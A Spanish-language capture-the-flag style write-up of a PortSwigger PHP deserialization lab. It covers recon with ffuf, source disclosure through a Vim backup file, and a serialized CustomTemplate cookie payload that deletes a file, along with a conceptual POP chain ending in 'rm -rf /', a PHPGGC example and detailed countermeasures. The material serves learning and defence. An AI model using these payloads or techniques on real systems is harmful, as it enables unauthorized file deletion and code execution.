# Writeup: Arbitrary object injection in PHP (PortSwigger)

- **Lab**: Arbitrary object injection in PHP
- **URL**: https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-arbitrary-object-injection-in-php
- **Categoría**: Insecure Deserialization / Arbitrary object injection / Magic method abuse (`__destruct`)
- **Dificultad**: Practitioner

---

## 1. Objetivo

La aplicación llama `unserialize()` sobre la cookie de sesión sin restringir las clases permitidas. Aunque la cookie original transporta un objeto `User`, podemos sustituirla por **un objeto serializado de cualquier otra clase definida en el código**. Si esa clase tiene un magic method peligroso (`__destruct`, `__wakeup`, `__toString`, etc.), el método se dispara automáticamente y opera sobre atributos que el atacante controla.

En este lab existe la clase `CustomTemplate` con `__destruct()` que llama `unlink($this->lock_file_path)`. Inyectando un objeto `CustomTemplate` con `lock_file_path = "/home/carlos/morale.txt"`, al final del request PHP destruye el objeto → corre el destructor → borra el archivo objetivo.

Credenciales: `wiener:peter`. Objetivo: borrar `/home/carlos/morale.txt`.

Cookie original decodificada (solo 2 atributos, no hay `avatar_link` como en el lab anterior):

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"vdmpqaocudv9f3xp1x7nhbduw4vf9bbq";}
```

Payload final (objeto inyectado de clase distinta):

```
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```

Re-encodear (Base64 + URL), reusar como cookie, mandar **cualquier request** (no hace falta endpoint específico). Lab solved.

### Insight central

**El cluster da un salto cualitativo en este lab**: los tres anteriores modificaban un atributo del objeto User existente (boolean flip, type juggling, path injection). Acá **inyectamos una clase completamente distinta**. La primitiva de "cookie no firmada" pasa de "controlo el state de mi User" a "instancio cualquier clase del código y disparo sus magic methods". Esto abre la puerta a **POP chains** (combinación de gadgets entre clases) que pueden escalar a RCE en apps con suficiente superficie de clases.

---

## 2. Recon y resolución

### 2.1 Login y captura de cookie

Login `wiener:peter`. Decodificar cookie:

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"vdmpqaocudv9f3xp1x7nhbduw4vf9bbq";}
```

Solo 2 atributos. La técnica del lab anterior (modificar `avatar_link`) no aplica — no existe ese campo. Hay que cambiar de estrategia: en lugar de modificar un atributo del User, **inyectar un objeto de otra clase**.

### 2.2 Búsqueda del source code

Para inyectar un objeto, necesitamos saber qué clases existen en el código y cuál tiene un sink explotable. Hay que descubrir el source.

**Falso punto de partida (anti-pattern)**: leer la solución oficial del lab. Spoilea el path (`/libs/CustomTemplate.php`) y el nombre de la clase. Útil para resolver, pero rompe el aprendizaje del proceso real de pentest. En este writeup documentamos cómo se llegaría sin spoilers.

**Recon real**:

1. **ffuf en el root** con wordlist mediana (`raft-small-directories-lowercase.txt`):

   ```bash
   /home/sebastian/bin/ffuf/ffuf \
     -u https://<lab-id>.web-security-academy.net/FUZZ \
     -w raft-small-directories-lowercase.txt \
     -mc all -fc 404 -t 20 -p 0.1
   ```

   Resultado: `logout`, `login`, `product`, `filter`, `my-account`, `analytics`. **No encontró `/libs`** (a pesar de estar en posición 213 de la wordlist). Razón probable: `/libs/` sin contenido index responde 404 o redirect que se filtra.

2. **HTML comment inspection** — el path real apareció leyendo el HTML del listado de productos:

   ```html
   <!-- TODO: Refactor once /libs/CustomTemplate.php is updated -->
   ```

   Comentario dejado por un dev en la página de productos que filtra:
   - El path (`/libs/CustomTemplate.php`).
   - El nombre de la clase (`CustomTemplate`).

   **Lección operacional**: cuando ffuf no encuentra paths, revisar TODOS los assets que devuelve la app — comentarios HTML, JS, CSS, robots.txt, sitemap.xml. Source disclosure por comentarios es el método #1 en CTFs y aparece en producción más seguido de lo que parece.

### 2.3 Source disclosure via Vim backup

Pedir `GET /libs/CustomTemplate.php` directo: PHP lo ejecuta, devuelve vacío (no hay output statements). No vemos el código.

Truco: muchos editores (Vim, Emacs, gedit) crean backups con sufijo `~` durante la edición. Si el web server sirve `*~` como `text/plain` (default Apache/nginx), podemos leer el código fuente:

```bash
curl -sk -i https://<lab-id>.../libs/CustomTemplate.php~
```

Response:

```http
HTTP/2 200
content-type: text/plain
content-length: 1130

<?php

class CustomTemplate {
    private $template_file_path;
    private $lock_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
        $this->lock_file_path = $template_file_path . ".lock";
    }

    private function isTemplateLocked() {
        return file_exists($this->lock_file_path);
    }

    public function getTemplate() {
        return file_get_contents($this->template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this->lock_file_path, "") === false) {
                throw new Exception("Could not write to " . $this->lock_file_path);
            }
            if (file_put_contents($this->template_file_path, $template) === false) {
                throw new Exception("Could not write to " . $this->template_file_path);
            }
        }
    }

    function __destruct() {
        // Carlos thought this would be a good idea
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
}

?>
```

**Bingo**. Tenemos la clase + el destructor + el atributo controlable.

Otras variantes de backup que probaríamos si `~` falla: `.bak`, `.old`, `.swp` (Vim swap), `.save`, `~$nombre.php` (Word backup), `nombre.php.orig`.

### 2.4 Análisis del gadget

| Elemento | Valor | Observación |
|---|---|---|
| Clase | `CustomTemplate` | 14 chars |
| Atributo objetivo | `lock_file_path` | 14 chars, `private` originalmente |
| Sink | `unlink($this->lock_file_path)` | dentro de `__destruct()` |
| Trigger | Fin de cualquier request donde el objeto exista | automático, GC de PHP |

Detalle relevante de PHP serialization de propiedades private: el formato canónico es `\x00ClassName\x00propname`. Pero al inyectar el blob desde fuera, si proveemos `lock_file_path` sin el prefijo null-byte, PHP crea una **propiedad pública** con ese nombre en el objeto deserializado. Cuando `__destruct()` accede a `$this->lock_file_path`, PHP la resuelve a la propiedad pública (no había una privada porque no la seteamos durante el unserialize). El sink corre con nuestro path.

La ironía didáctica: el comentario del código `// Carlos thought this would be a good idea` pone el dedo en el patrón. El dev pensó que "limpiar el lock file en `__destruct`" era una idea buena. La consecuencia: cualquier deserialización con `lock_file_path` controlado borra archivos arbitrarios.

### 2.5 Construcción del payload

```
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```

Lengths verificados:
- `O:14:` → `CustomTemplate` (14 chars).
- `:1:` → 1 propiedad declarada.
- `s:14:` → `lock_file_path` (14 chars).
- `s:23:` → `/home/carlos/morale.txt` (23 chars).

Notar que NO replicamos `template_file_path`. No es necesario — el destructor solo lee `lock_file_path`. Las propiedades omitidas en el blob simplemente no existen en el objeto reconstruido. PHP no se queja.

### 2.6 Encodificación y delivery

1. Burp Decoder: payload plaintext → **Encode as Base64** → limpiar `\n` final → **Encode as URL** forzando `=` → `%3d`.
2. Reemplazar `Cookie: session=...` con el blob.
3. Mandar **cualquier request** — un `GET /` basta. El `unserialize()` corre durante el bootstrap del request, instancia el `CustomTemplate`. Al final del request, el GC de PHP destruye los objetos en memoria → corre `__destruct` → `unlink`.

Response observada: `HTTP/2 500 Internal Server Error`. Esperado: el handler de la app espera un objeto User (con `username`, `access_token`), recibe un CustomTemplate que no tiene esos atributos → fail. Pero el sink ya corrió en `__destruct` antes del crash. Refresh del lab → "Solved".

**Detalle elegante del exploit**: el atacante no necesita ninguna acción específica. La cookie tampered con un magic method gadget convierte cada request en un disparador del sink. Esto es muy distinto al lab anterior que requería el `POST /my-account/delete` específicamente.

---

## 3. Por qué funciona

### 3.1 PHP `unserialize()` sin `allowed_classes`

PHP `unserialize($input)` por default acepta cualquier clase definida en el código (autoloaded o ya cargada). Si el código no pasa `['allowed_classes' => ['User']]`, el atacante elige la clase.

```php
// Vulnerable:
$obj = unserialize($_COOKIE['session']);

// Defensiva (PHP 7+):
$obj = unserialize($_COOKIE['session'], ['allowed_classes' => ['User']]);
```

La defensa específica de `allowed_classes` está disponible desde PHP 7.0 (2015). Apps que la usan están protegidas contra arbitrary object injection (no contra tampering del User si se permite User). Apps que no la usan son explotables si existe alguna clase con magic method peligroso.

### 3.2 Magic methods que se disparan automáticamente

PHP tiene magic methods que corren bajo ciertas condiciones, sin invocación explícita del programador:

| Magic method | Cuándo se dispara | Riesgo |
|---|---|---|
| `__construct()` | Al instanciar (`new`) | Bajo (no se ejecuta durante `unserialize`) |
| `__destruct()` | Al destruir el objeto (fin de request, `unset`, GC) | **Alto** (siempre corre) |
| `__wakeup()` | Inmediatamente después de `unserialize` | **Alto** (siempre corre) |
| `__toString()` | Cuando el objeto se castea a string (`echo`, concat) | Medio (requiere uso) |
| `__call()` | Al llamar método inexistente | Medio |
| `__get()` / `__set()` | Acceso a propiedad inexistente | Bajo (raro durante unserialize) |
| `__invoke()` | Cuando el objeto se llama como función | Medio |

`__destruct` y `__wakeup` son los más peligrosos para deserialization injection: **siempre se ejecutan** sin que el atacante tenga que orquestar nada. Cualquier atributo que toquen es atacable.

### 3.3 Diferencia con los 3 labs anteriores del cluster

| Aspecto | Lab 1 (objects) | Lab 2 (data types) | Lab 3 (app functionality) | **Lab 4 (object injection)** |
|---|---|---|---|---|
| Clase manipulada | User | User | User | **CustomTemplate (otra)** |
| Modificación | flip `b:0` → `b:1` | type switch `s:N:` → `i:0` | path substitution con length recalc | **inyección de clase nueva** |
| Sink | check `if (admin)` | `==` loose | handler explícito `unlink($path)` | **`__destruct` automático** |
| Trigger | acceso a `/admin` | acceso a `/admin` | `POST /my-account/delete` | **cualquier request** |
| Conocimiento previo | nombre del campo `admin` | tipo del `access_token` | nombre y uso de `avatar_link` | **clase + magic method del codebase** |
| PHP defense que cierra el vector | firma cookie | `===` strict / PHP 8 | path validation | **`allowed_classes` en unserialize** |

El cluster va escalando complejidad de la primitiva de explotación. Lab 4 introduce el concepto de "objeto inyectado de clase elegida por atacante" — la antesala de POP chains.

### 3.4 POP chains: el siguiente paso

Lo que viene después de "inyectar un objeto con magic method" es **POP chain** (Property-Oriented Programming): combinar magic methods de varias clases para construir un exploit complejo. Ejemplo conceptual:

```
Atacante inyecta ClaseA -> __destruct() llama $this->cleanup->run()
                          -> $this->cleanup es ClaseB inyectada
                          -> ClaseB->run() llama $this->callable($this->arg)
                          -> $this->callable = "system", $this->arg = "rm -rf /"
                          -> RCE
```

Herramienta clásica: **PHPGGC** (PHP Generic Gadget Chains) — equivalente PHP de ysoserial. Pre-construye chains conocidas para Laravel, Symfony, WordPress, etc.

```bash
# Ejemplo: generar payload Laravel/RCE1 que ejecuta whoami
phpggc Laravel/RCE1 system 'whoami'
```

Este lab es la introducción al concepto. El próximo cluster del PortSwigger track (Custom Gadget Chains) profundiza en construir chains a mano cuando no hay framework conocido.

### 3.5 Por qué el comentario `// Carlos thought this would be a good idea` es revelador

El developer pensó que era buena idea limpiar el lock file en `__destruct`. La intención: garantizar que aunque el script crashee, el lock se libera. Es un patrón legítimo en código defensivo (cleanup en RAII).

El bug no es el `__destruct` per se. El bug es la combinación:
1. El destructor opera sobre un atributo (`lock_file_path`).
2. El atributo es deserializable.
3. El input se deserializa sin validar la clase.

Cualquiera de las tres condiciones rotas cierra el vector:
- Si el destructor solo borrara un path hardcoded (`unlink('/tmp/template.lock')`), no hay control del atacante.
- Si la clase fuera marcada como `final` y el unserialize tuviera `allowed_classes => ['User']`, no se puede instanciar.
- Si la cookie estuviera firmada con HMAC, no se puede inyectar el blob.

La lección amplia: **cualquier clase con magic method que toque el filesystem, la base de datos, o haga callable dispatch es un gadget candidato**. Auditar codebases buscando `__destruct`, `__wakeup`, `__toString` y mapear qué hacen.

### 3.6 Por qué el response 500 no impide el exploit

El handler de la app espera un User. Recibe un CustomTemplate. Cuando intenta acceder `$session->username` o similar, falla y throw → 500. Pero el flujo de PHP es:

1. Request entra → `unserialize($_COOKIE['session'])` → CustomTemplate instanciado.
2. Handler intenta procesar la "sesión" → throw exception → 500 al cliente.
3. PHP termina el request → invoca destructores de objetos en memoria → `CustomTemplate::__destruct` corre → `unlink('/home/carlos/morale.txt')`.

El sink corre INDEPENDIENTEMENTE del éxito del handler. Esa es la fortaleza del vector vía `__destruct`: **no requiere flujo exitoso**, solo requiere que el objeto haya sido instanciado en memoria.

Si el sink fuera vía `__wakeup` (corre justo después de unserialize), correría aún más temprano — antes incluso de que el handler intente procesar nada. Igual de robusto.

### 3.7 Por qué el lab no requiere el destructor "clean up" del User original

El backend probablemente hace algo como:

```php
$session = unserialize($_COOKIE['session']);
if (!$session instanceof User) {
    http_response_code(500);
    exit;
}
// ... procesar User
```

El `unserialize` ya creó el objeto CustomTemplate. El check posterior puede rechazarlo, pero es tarde. El objeto ya está en memoria, y al fin del request `__destruct` corre.

Defensa correcta: **type checking ANTES de `unserialize`**, no después. Pero PHP no permite esto fácilmente — solo `allowed_classes` durante el unserialize logra el efecto.

---

## 4. Resumen

```mermaid
flowchart LR
    A[1. Login wiener:peter, decodificar cookie revela User con 2 attrs - sin avatar_link]
    B[2. Estrategia cambia: inyectar otra clase, no modificar User]
    C[3. Recon paths: ffuf no encuentra libs, HTML comment revela /libs/CustomTemplate.php]
    D[4. Source disclosure via .php~ Vim backup]
    E[5. Análisis: CustomTemplate __destruct unlink lock_file_path]
    F[6. Payload: O:14:CustomTemplate:1 lock_file_path /home/carlos/morale.txt]
    G[7. Base64+URL encode, reusar como cookie]
    H[8. GET / dispara unserialize, fin request __destruct corre]
    I[9. unlink borra morale.txt - 500 esperado]
    J[10. Lab solved]

    A --> B --> C --> D --> E --> F --> G --> H --> I --> J
```



Tres ideas:

1. **El cluster de deserialización escala primitivas**: lab 1 (boolean flip), lab 2 (type juggling), lab 3 (path injection en atributo de User), lab 4 (**inyección de clase distinta con magic method**). Cada paso amplía la superficie de ataque manteniendo la primitiva base (cookie no firmada). Lab 4 es la antesala a POP chains, donde se combinan gadgets entre clases para escalar a RCE.
2. **Source disclosure por HTML comments es real y subestimado**. ffuf no encontró `/libs/`; un comentario `<!-- TODO: ... /libs/CustomTemplate.php ... -->` lo entregó en bandeja. Lección operacional: revisar TODOS los assets devueltos por la app (HTML comments, JS, CSS, sourcemaps `.map`, robots.txt, sitemap.xml, headers como `X-Powered-By`, response bodies de errors) antes de tirar wordlists. Source disclosure por backup files (`*~`, `.bak`, `.swp`) cuando el server sirve los archivos como text/plain es otro vector recurrente.
3. **`__destruct` y `__wakeup` son sinks "siempre activos" — cualquier objeto deserializado los dispara automáticamente**. Auditar PHP codebases buscando estos magic methods que toquen filesystem, callables, o DB es la forma sistemática de encontrar gadgets. La defensa única estructural es `unserialize($input, ['allowed_classes' => ['Whitelist']])` — disponible desde PHP 7.0; cualquier app que no la use es explotable si existe siquiera un magic method peligroso en su codebase o dependencias.

---

## 5. Contramedidas

1. **`unserialize()` con `allowed_classes`** (PHP 7+): `unserialize($input, ['allowed_classes' => ['User']])`. Limita instanciación a clases conocidas. Defensa específica contra arbitrary object injection. **Defensa única que cierra este vector específico.**
2. **Firmar la cookie con HMAC**: el atacante no puede inyectar blobs porque no conoce la key. Defensa estructural transversal a todos los labs del cluster.
3. **No deserializar input del cliente como mecanismo de session**: usar Session ID opaco (UUID) + state server-side (Redis/DB). El cliente no manda objetos, manda un identificador.
4. **Auditar magic methods en el codebase**: `grep -rn "__destruct\|__wakeup\|__toString\|__call\|__invoke" .`. Mapear qué hacen, qué atributos tocan. Cualquier sink (`unlink`, `eval`, `system`, `include`, callable dispatch, file ops, DB queries) que llegue a un atributo controlable es gadget candidato.
5. **Marcar clases sensibles como `final` o no instanciables vía `unserialize`**: implementar `__wakeup()` que tire excepción si la clase no debería deserializarse: `function __wakeup() { throw new Exception("Not deserializable"); }`. Patrón de defensa en profundidad.
6. **Migrar a JSON con schema strict**: serialización en formato no-tipado elimina la capacidad de instanciar clases. JSON Schema validators chequean tipo y forma del input. Reescritura grande pero defensa estructural.
7. **PHP `disable_functions` para sinks peligrosos**: `disable_functions = exec,system,passthru,shell_exec` en `php.ini`. Defensa de SO que limita el daño aún si hay deserialization injection.
8. **`open_basedir`**: restringir todas las file operations al directorio de la app. `unlink()` fuera del scope falla → exploit no puede tocar `/home/carlos/`.
9. **Logging de instanciation inesperada**: si la app logea cuando `unserialize` produce un objeto que no es User esperado, hay señal de tampering. Detección post-explotación + alerta a SOC.
10. **PHPGGC scanning en CI**: integrar `phpggc --list` con scanners de payloads conocidos sobre los inputs deserializables. Defensa de aplicación contra POP chains documentadas.
11. **Backup files no deben estar en webroot**: configurar Apache/nginx para 403 sobre `*.bak`, `*~`, `*.swp`, `*.orig`, `*.old`. Cierra el vector de source disclosure.
12. **HTML comment scrubbing en build**: minificadores (UglifyJS, html-minifier) pueden eliminar comentarios. Reduce information leakage hacia atacantes.

---

## 6. Referencias

- PortSwigger Web Security Academy. (s.f.). *Lab: Arbitrary object injection in PHP*. https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-arbitrary-object-injection-in-php
- PortSwigger Web Security Academy. (s.f.). *Insecure deserialization*. https://portswigger.net/web-security/deserialization
- PHP Manual. (s.f.). *unserialize()*. https://www.php.net/manual/en/function.unserialize.php
- PHP Manual. (s.f.). *Magic Methods*. https://www.php.net/manual/en/language.oop5.magic.php
- PHP Manual. (s.f.). *Object Serialization*. https://www.php.net/manual/en/language.oop5.serialization.php
- OWASP Foundation. (2021). *OWASP Top 10 A08: Software and Data Integrity Failures*. https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/
- OWASP Foundation. (s.f.). *Deserialization Cheat Sheet*. https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
- ambionics security. (s.f.). *PHPGGC: PHP Generic Gadget Chains* [Software]. GitHub. https://github.com/ambionics/phpggc
- MITRE Corporation. (2024). *CWE-502: Deserialization of Untrusted Data*. https://cwe.mitre.org/data/definitions/502.html
- MITRE Corporation. (2024). *CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes*. https://cwe.mitre.org/data/definitions/915.html
- MITRE Corporation. (2024). *ATT&CK Technique T1190: Exploit Public-Facing Application*. https://attack.mitre.org/techniques/T1190/
- swisskyrepo. (s.f.). *PayloadsAllTheThings — Insecure Deserialization (PHP)*. https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization
- Stuttard, D., & Pinto, M. (2011). *The Web Application Hacker's Handbook* (2nd ed.). Wiley. Cap. 11 (Attacking Application Logic).
- Inventario interno: [`inventario/03-analisis-vulnerabilidades/web/analisis-deserialization.md`](../../../inventario/03-analisis-vulnerabilidades/web/analisis-deserialization.md), [`inventario/04-explotacion/web/explotacion-deserialization.md`](../../../inventario/04-explotacion/web/explotacion-deserialization.md)
- Writeups previos del cluster: [`learning/portswigger/deserialization-modifying-serialized-objects/writeup.md`](../deserialization-modifying-serialized-objects/writeup.md), [`learning/portswigger/deserialization-modifying-serialized-data-types/writeup.md`](../deserialization-modifying-serialized-data-types/writeup.md), [`learning/portswigger/deserialization-using-application-functionality/writeup.md`](../deserialization-using-application-functionality/writeup.md)
